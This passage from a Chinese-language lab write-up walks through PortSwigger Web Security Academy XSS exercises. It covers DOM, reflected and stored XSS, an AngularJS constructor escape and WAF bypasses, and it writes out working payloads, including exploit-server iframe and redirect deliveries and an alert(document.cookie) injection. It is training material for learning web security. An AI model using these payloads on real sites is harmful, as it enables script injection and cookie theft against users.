获取描点部分(# 及 # 以后的内容)</span></span><br><span class="line"><span class="comment">slice(start,end) 用于截取,不包含end</span></span><br><span class="line"><span class="comment">decodeURIComponent 用于url解码</span></span><br><span class="line"><span class="comment">$() 表示选择器，选择section元素中class的blog-list部分，在其中查找所有h2标签，使用:contains伪类选择器匹配包含指定文本的h2元素</span></span><br><span class="line"><span class="comment">scrollIntoView 将元素滚动到视口中</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<img src="/XSS/XSS/image-20250728091507536.png" class="" title="image-20250728091507536">

<p>比如我们输入#Passwords</p>
<img src="/XSS/XSS/image-20250728091718036.png" class="" title="image-20250728091718036">

<p>scrollIntoView就会跳转到<code> &lt;h2&gt;Passwords&lt;/h2&gt;</code>。</p>
<p>location.hash我们可以控制，我们输入恶意代码：<code>&lt;img src=1 onerror=print() /&gt;</code></p>
<p>$()会解析这段，并将img创建为DOM元素，scrollIntoView将创建好的DOM元素加入到DOM中并进行渲染触发XSS代码。</p>
<img src="/XSS/XSS/image-20250728092825188.png" class="" title="image-20250728092825188">

<p>现在就已经触发了print。</p>
<p>要完成实验的话，要进入：</p>
<img src="/XSS/XSS/image-20250728093827800.png" class="" title="image-20250728093827800">

<p>向body注入：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;https://0aaf001e041c2090a807a401006c0035.web-security-academy.net/#&quot;</span> <span class="attr">onload</span>=<span class="string">&quot;this.src+=&#x27;&lt;img src=1 onerror=print() /&gt;&#x27;&quot;</span> <span class="attr">hidden</span>=<span class="string">&quot;hidden&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>store储存起来，然后将漏洞传递给受害者即可完成实验。</p>
<img src="/XSS/XSS/image-20250728093937822.png" class="" title="image-20250728093937822">

<p>第三个按钮。</p>
<h3 id="AngularJS表达式中存在DOM型跨站脚本（XSS）漏洞，且尖括号和双引号被HTML编码"><a href="#AngularJS表达式中存在DOM型跨站脚本（XSS）漏洞，且尖括号和双引号被HTML编码" class="headerlink" title="AngularJS表达式中存在DOM型跨站脚本（XSS）漏洞，且尖括号和双引号被HTML编码"></a>AngularJS表达式中存在DOM型跨站脚本（XSS）漏洞，且尖括号和双引号被HTML编码</h3><h4 id="实验要求：-6"><a href="#实验要求：-6" class="headerlink" title="实验要求："></a>实验要求：</h4><p>该实验在搜索功能中存在一个基于DOM的跨站脚本漏洞，漏洞位于AngularJS表达式中。</p>
<p>AngularJS是一个流行的JavaScript库，它会扫描包含ng-app属性（称为AngularJS指令）的HTML节点内容。当在HTML代码中添加该指令时，您可以在双大括号内执行JavaScript表达式。在尖括号被编码的情况下，这种技术特别有用。</p>
<p>要完成本实验，请发起一个跨站脚本攻击，执行AngularJS表达式并调用alert函数。</p>
<h4 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程:"></a>实验过程:</h4><p>F12 打开开发这工具，进入源码：</p>
<img src="/XSS/XSS/image-20250728114042113.png" class="" title="image-20250728114042113">

<p>angular1.7.7。</p>
<img src="/XSS/XSS/image-20250728114151058.png" class="" title="image-20250728114151058">

<p>ng-app属性，可以在body内，通过模板语法：<code>&#123;&#123;&#125;&#125;</code>，进行JavaScript的代码执行，但是只能执行简单的表达式，我们可以通过constructor获取Function构造函数，执行任意表达式：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; $on.<span class="title function_">constructor</span>(<span class="params"><span class="string">&#x27;alert(1)&#x27;</span></span>)(<span class="params"></span>)&#125;&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">$on angular的监听器</span></span><br><span class="line"><span class="comment">$on.constructor 获取 Function方法</span></span><br><span class="line"><span class="comment">(&#x27;alert(1)&#x27;)() 执行alert(1)</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<img src="/XSS/XSS/image-20250728114641923.png" class="" title="image-20250728114641923">

<h3 id="反射型-DOM-XSS漏洞"><a href="#反射型-DOM-XSS漏洞" class="headerlink" title="反射型 DOM XSS漏洞"></a>反射型 DOM XSS漏洞</h3><h4 id="实验要求：-7"><a href="#实验要求：-7" class="headerlink" title="实验要求："></a>实验要求：</h4><p>该实验演示了一种反射型DOM漏洞。当服务器端应用程序处理来自请求的数据并在响应中回显这些数据时，就会出现反射型DOM漏洞。页面上的脚本随后以不安全的方式处理这些被反射的数据，最终将其写入危险的接收器（dangerous sink）。</p>
<p>要解决该实验，需构造一个能调用alert()函数的注入攻击。</p>
<h4 id="实验过程：-7"><a href="#实验过程：-7" class="headerlink" title="实验过程："></a>实验过程：</h4><p>首页有一个搜索页面：</p>
<img src="/XSS/XSS/image-20250729092941883.png" class="" title="image-20250729092941883">

<p>输入内容123.</p>
<img src="/XSS/XSS/image-20250729093020885.png" class="" title="image-20250729093020885">

<p>按f12，打开开发者工具，进入源码位置。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&#x27;/resources/js/searchResults.js&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 引入了一个searchResults.js脚本 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">search</span>(<span class="string">&#x27;search-results&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 调用了search函数 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">section</span> <span class="attr">class</span>=<span class="string">&quot;blog-header&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">section</span> <span class="attr">class</span>=<span class="string">search</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">/</span> <span class="attr">method</span>=<span class="string">GET</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">text</span> <span class="attr">placeholder</span>=<span class="string">&#x27;Search the blog...&#x27;</span> <span class="attr">name</span>=<span class="string">search</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">class</span>=<span class="string">button</span>&gt;</span>Search<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>跟进searchResults.js脚本：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">search</span>(<span class="params">path</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>(); <span class="comment">// 创建XMLHttpRequest对象</span></span><br><span class="line">    xhr.<span class="property">onreadystatechange</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">readyState</span> == <span class="number">4</span> &amp;&amp; <span class="variable language_">this</span>.<span class="property">status</span> == <span class="number">200</span>) &#123;</span><br><span class="line">            <span class="built_in">eval</span>(<span class="string">&#x27;var searchResultsObj = &#x27;</span> + <span class="variable language_">this</span>.<span class="property">responseText</span>);</span><br><span class="line">            <span class="title function_">displaySearchResults</span>(searchResultsObj);</span><br><span class="line">        &#125; <span class="comment">// 定义了一个回调函数</span></span><br><span class="line">    &#125;;</span><br><span class="line">    xhr.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>, path + <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>); <span class="comment">// 初始化请求</span></span><br><span class="line">    xhr.<span class="title function_">send</span>(); <span class="comment">// 发送数据</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>path: search-results 相对路径。</p>
<p>我们是在：<code>https://0a8e0086032fb0aa818e0dda00830017.web-security-academy.net/</code>发送请求的。</p>
<p>send发送数据，访问的是<code>https://0a8e0086032fb0aa818e0dda00830017.web-security-academy.net/search-results?search=123</code></p>
<p>我们访问一下，返回如下内容：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;results&quot;:[],&quot;searchTerm&quot;:&quot;123&quot;&#125;</span><br></pre></td></tr></table></figure>

<img src="/XSS/XSS/image-20250729094620108.png" class="" title="image-20250729094620108">

<p>xhr.responseText 返回：<code>&#39;&#123;&quot;results&quot;:[],&quot;searchTerm&quot;:&quot;123&quot;&#125;&#39;</code>。</p>
<p>这是漏洞点：<code>eval(&#39;var searchResultsObj = &#39; + this.responseText);</code></p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&#125;; alert(&#x27;XSS&#x27;)//</span><br></pre></td></tr></table></figure>

<img src="/XSS/XSS/image-20250729095151425.png" class="" title="image-20250729095151425">

<p>对我们恶意闭合的双引号进行了转义，那我们再输入一个转义符号，让转义符号转义他自己。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\&quot;&#125;; alert(&#x27;XSS&#x27;);//</span><br></pre></td></tr></table></figure>

<img src="/XSS/XSS/image-20250729095350905.png" class="" title="image-20250729095350905">

<img src="/XSS/XSS/image-20250729095414229.png" class="" title="image-20250729095414229">

<h3 id="存储型-DOM-XSS漏洞"><a href="#存储型-DOM-XSS漏洞" class="headerlink" title="存储型 DOM XSS漏洞"></a>存储型 DOM XSS漏洞</h3><h4 id="实验要求：-8"><a href="#实验要求：-8" class="headerlink" title="实验要求："></a>实验要求：</h4><p>该实验演示了博客评论功能中的一个存储型DOM漏洞。要完成实验，请利用此漏洞触发<code>alert()</code>函数。</p>
<h4 id="实验过程：-8"><a href="#实验过程：-8" class="headerlink" title="实验过程："></a>实验过程：</h4><p>实验要求告诉我们博客评论功能存在储存型DOM漏洞。</p>
<p>我们进入博客，进入一篇文章，按f12，进入源码，找到评论提交位置：</p>
<img src="/XSS/XSS/image-20250729135925123.png" class="" title="image-20250729135925123">

<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/post/comment&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">required</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;csrf&quot;</span> <span class="attr">value</span>=<span class="string">&quot;XgRrRnk7KxSKyQDQMNY5fdag6SUrZ7vp&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">required</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;postId&quot;</span> <span class="attr">value</span>=<span class="string">&quot;4&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span>&gt;</span>Comment:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">required</span> <span class="attr">rows</span>=<span class="string">&quot;12&quot;</span> <span class="attr">cols</span>=<span class="string">&quot;300&quot;</span> <span class="attr">name</span>=<span class="string">&quot;comment&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span>&gt;</span>Name:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">required</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span>&gt;</span>Email:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">required</span> <span class="attr">type</span>=<span class="string">&quot;email&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span>&gt;</span>Website:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">pattern</span>=<span class="string">&quot;(http:|https:).+&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;website&quot;</span>&gt;</span>  <span class="comment">&lt;!-- 前端有一个正则表达式 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;button&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>Post Comment<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>Ctrl+F，搜索<code>script</code>标签。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&#x27;/resources/js/loadCommentsWithVulnerableEscapeHtml.js&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">loadComments</span>(<span class="string">&#x27;/post/comment&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>58、59行；调用了一个函数loadComments，跟进loadCommentsWithVulnerableEscapeHtml.js脚本：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">loadComments</span>(<span class="params">postCommentPath</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();  </span><br><span class="line">    xhr.<span class="property">onreadystatechange</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">readyState</span> == <span class="number">4</span> &amp;&amp; <span class="variable language_">this</span>.<span class="property">status</span> == <span class="number">200</span>) &#123;</span><br><span class="line">            <span class="keyword">let</span> comments = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="variable language_">this</span>.<span class="property">responseText</span>); <span class="comment">// 用JSON.parse可以修复上一题的漏洞</span></span><br><span class="line">            <span class="title function_">displayComments</span>(comments);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    xhr.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>, postCommentPath + <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>);</span><br><span class="line">    xhr.<span class="title function_">send</span>();</span><br><span class="line"><span class="comment">// 上面这些内容没啥好说的。</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">escapeHTML</span>(<span class="params">html</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> html.<span class="title function_">replace</span>(<span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;&amp;lt;&#x27;</span>).<span class="title function_">replace</span>(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;&amp;gt;&#x27;</span>); <span class="comment">// 这个有一个特性，我不知道的特性，就因为我不知道，导致这道题没有做出来，后面说。我先说说我当时的思路</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">displayComments</span>(<span class="params">comments</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> userComments = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;user-comments&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; comments.<span class="property">length</span>; ++i)</span><br><span class="line">        &#123;</span><br><span class="line">            comment = comments[i];</span><br><span class="line">            <span class="keyword">let</span> commentSection = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;section&quot;</span>);</span><br><span class="line">            commentSection.<span class="title function_">setAttribute</span>(<span class="string">&quot;class&quot;</span>, <span class="string">&quot;comment&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">let</span> firstPElement = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;p&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">let</span> avatarImgElement = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;img&quot;</span>);</span><br><span class="line">            avatarImgElement.<span class="title function_">setAttribute</span>(<span class="string">&quot;class&quot;</span>, <span class="string">&quot;avatar&quot;</span>);</span><br><span class="line">            avatarImgElement.<span class="title function_">setAttribute</span>(<span class="string">&quot;src&quot;</span>, comment.<span class="property">avatar</span> ? <span class="title function_">escapeHTML</span>(comment.<span class="property">avatar</span>) : <span class="string">&quot;/resources/images/avatarDefault.svg&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (comment.<span class="property">author</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (comment.<span class="property">website</span>) &#123;</span><br><span class="line">                    <span class="keyword">let</span> websiteElement = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">                    websiteElement.<span class="title function_">setAttribute</span>(<span class="string">&quot;id&quot;</span>, <span class="string">&quot;author&quot;</span>);</span><br><span class="line">                    websiteElement.<span class="title function_">setAttribute</span>(<span class="string">&quot;href&quot;</span>, comment.<span class="property">website</span>); <span class="comment">// 当时我看到这里没有做任何处理，我以为漏洞在这里。</span></span><br><span class="line">                    firstPElement.<span class="title function_">appendChild</span>(websiteElement)</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">let</span> newInnerHtml = firstPElement.<span class="property">innerHTML</span> + <span class="title function_">escapeHTML</span>(comment.<span class="property">author</span>)</span><br><span class="line">                firstPElement.<span class="property">innerHTML</span> = newInnerHtml  <span class="comment">// 这里将a标签放进p标签里。</span></span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">// ......</span></span><br></pre></td></tr></table></figure>

<p>a 标签的href属性可以利用  javascript 伪协议 来执行代码。正则在前端，我将<code>pattern=&quot;(http:|https:).+&quot;</code>，修改为<code>pattern=&quot;(http:|https:|javascript:).+&quot;</code>，接着输入内容：</p>
<img src="/XSS/XSS/image-20250729141738758.png" class="" title="image-20250729141738758">

<img src="/XSS/XSS/image-20250729141829147.png" class="" title="image-20250729141829147">

<p>它后端还会识别网站，我输入<code>http://example.com</code>可以，说明必须以<code>http:</code>或<code>https:</code>开头。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">websiteElement.<span class="title function_">setAttribute</span>(<span class="string">&quot;href&quot;</span>, comment.<span class="property">website</span>);</span><br></pre></td></tr></table></figure>

<p>我试过恶意闭合双引号等办法，都已失败告终。</p>
<p>现在看看正确的解题方法：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">html.<span class="title function_">replace</span>(<span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;&amp;lt;&#x27;</span>).<span class="title function_">replace</span>(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;&amp;gt;&#x27;</span>); <span class="comment">// 如果html是字符串时，replace只会替换一次。</span></span><br></pre></td></tr></table></figure>

<img src="/XSS/XSS/image-20250729143741564.png" class="" title="image-20250729143741564">

<img src="/XSS/XSS/image-20250729143716823.png" class="" title="image-20250729143716823">

<p><code>&lt;/h2&gt;</code>被解析了，所以我们看不到，当我们输入: <code>&lt;h2&gt;&lt;h2&gt;hello&lt;/h2&gt;</code>:</p>
<img src="/XSS/XSS/image-20250729143915705.png" class="" title="image-20250729143915705">

<p>第一个&lt;&gt;被替换，导致我们后面的可以被解析成功，我们可以看到。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;&gt;&lt;img src=1 onerror=alert(1) /&gt;</span><br></pre></td></tr></table></figure>

<img src="/XSS/XSS/image-20250729144419379.png" class="" title="image-20250729144419379">

<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (comment.<span class="property">body</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> commentBodyPElement = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;p&quot;</span>);</span><br><span class="line">    commentBodyPElement.<span class="property">innerHTML</span> = <span class="title function_">escapeHTML</span>(comment.<span class="property">body</span>);  <span class="comment">// 我们从这里写入恶意代码。</span></span><br><span class="line"></span><br><span class="line">    commentSection.<span class="title function_">appendChild</span>(commentBodyPElement);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>做到这里，感觉有一些虚浮了，后面学习的时候要总结总结了。总结这些漏洞到底是由啥引起的，做到这里，我都忘记了有些漏洞到底是有啥引起的。</p>
</blockquote>
<h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><h3 id="HTML标签之间的XSS攻击"><a href="#HTML标签之间的XSS攻击" class="headerlink" title="HTML标签之间的XSS攻击"></a>HTML标签之间的XSS攻击</h3><h4 id="大多数标签和属性被禁止的反射型XSS攻击"><a href="#大多数标签和属性被禁止的反射型XSS攻击" class="headerlink" title="大多数标签和属性被禁止的反射型XSS攻击"></a>大多数标签和属性被禁止的反射型XSS攻击</h4><h5 id="实验要求-1"><a href="#实验要求-1" class="headerlink" title="实验要求"></a>实验要求</h5><p>该实验在搜索功能中存在一个反射型XSS（跨站脚本）漏洞，但使用了Web应用防火墙(WAF)来防御常见的XSS攻击向量。</p>
<p>实验目标是：构造一个能够绕过WAF防护并成功调用print()函数的跨站脚本攻击。</p>
<p>重要说明：<br>您的解决方案必须无需任何用户交互。在您自己的浏览器中手动调用print()函数将无法完成实验。</p>
<h5 id="实验过程-1"><a href="#实验过程-1" class="headerlink" title="实验过程"></a>实验过程</h5><p>实验告诉我们搜索功能这里存在反射型XSS漏洞。</p>
<p>我在这里测试了好几个标签，如：<code>a、input、button、img、script</code>，这些都被过滤了。</p>
<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">XSS payload 备忘录</a></p>
<p>打开代理，打开yakit，启用交互式劫持，输入<code>&lt;&gt;</code>。</p>
<p>进入Web Fuzzer。</p>
<img src="/XSS/XSS/image-20250730100152059.png" class="" title="image-20250730100152059">

<p>复制tags标签。</p>
<img src="/XSS/XSS/image-20250730095938675.png" class="" title="image-20250730095938675">

<p>插入到临时字典。</p>
<img src="/XSS/XSS/image-20250730100257643.png" class="" title="image-20250730100257643">

<p>发送请求。</p>
<img src="/XSS/XSS/image-20250730100526491.png" class="" title="image-20250730100526491">

<p>body标签可用，输入<code>&lt;body onload=alert()&gt;</code></p>
<img src="/XSS/XSS/image-20250730100628951.png" class="" title="image-20250730100628951">

<p>onload属性也被禁止了，复制events事件，插入到临时字典，发起请求。</p>
<img src="/XSS/XSS/image-20250730100912245.png" class="" title="image-20250730100912245">

<p>里面有一个onresize事件，属性没有禁止，如何触发onresize事件，当修改窗口大小时，会触发。</p>
<img src="/XSS/XSS/image-20250730101221902.png" class="" title="image-20250730101221902">

<p>题目要求:您的解决方案必须无需任何用户交互。在您自己的浏览器中手动调用print()函数将无法完成实验。</p>
<p>进入服务器，在body输入：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&#x27;https://0a0900ba03d4a87980091c2a00890047.web-security-academy.net/?search=%3Cbody+onresize%3Dprint%28%29+%3E&#x27;</span> <span class="attr">onload</span>=<span class="string">&#x27;this.style.height=300&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>储存后，将其发给受害者，在加载完成后，触发onload事件，修改了高度，触发onresize事件，执行print()函数。</p>
<blockquote>
<p>此题是后端的waf。</p>
</blockquote>
<h4 id="禁止了所有除自制标签以外的所有标签的XSS攻击"><a href="#禁止了所有除自制标签以外的所有标签的XSS攻击" class="headerlink" title="禁止了所有除自制标签以外的所有标签的XSS攻击"></a>禁止了所有除自制标签以外的所有标签的XSS攻击</h4><h5 id="实验要求-2"><a href="#实验要求-2" class="headerlink" title="实验要求"></a>实验要求</h5><p>这个实验会屏蔽所有 HTML 标签，只允许自定义标签。</p>
<p>要解决这个实验，需要实施一次跨站脚本攻击，注入一个自定义标签，并自动弹出<code>document.cookie</code>（文档的 Cookie 信息）。</p>
<h5 id="实验过程-2"><a href="#实验过程-2" class="headerlink" title="实验过程"></a>实验过程</h5><p>搜索界面存在XSS漏洞，实验告诉我们屏蔽了所有HTML标签，只允许自制标签。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?search=&lt;xss id=&#x27;xss&#x27; onfocus=alert(1) tabindex=1 &gt;#xss</span><br></pre></td></tr></table></figure>

<p>tabindex属性赋予xss标签能够被聚焦的能力，1表示第一个被触发。</p>
<p>onfocus事件：当元素获得聚焦时触发。</p>
<p>id&#x3D;’xxx’ 给xss标签赋予id。</p>
<p>#xss  让页面滚动到id&#x3D;’xss’的元素，间接触发元素的聚焦行为。</p>
<p>这个过程还需要手动去触发。</p>
<img src="/XSS/XSS/image-20250730115204233.png" class="" title="image-20250730115204233">

<p>但是当我们将其保存到服务器，将1换为document.cookie：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">window.location=&#x27;https://0ab200d303fc4ab380cd9e1200f500a0.web-security-academy.net/?search=%3Cxss%20id=%27xss%27%20onfocus=alert(document.cookie)%20tabindex=1%20%3E#xss&#x27;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>我们将其保存在<a target="_blank" rel="noopener" href="https://exploit-0a8d009203e74a8080659d5b01dd0002.exploit-server.net/exploit%E9%A1%B5%E9%9D%A2%E3%80%82">https://exploit-0a8d009203e74a8080659d5b01dd0002.exploit-server.net/exploit页面。</a></p>
<p>将这个网址发送给受害者就会触发xss漏洞。</p>
<p>我们要完成此实验：</p>
<img src="/XSS/XSS/image-20250730115837685.png" class="" title="image-20250730115837685">

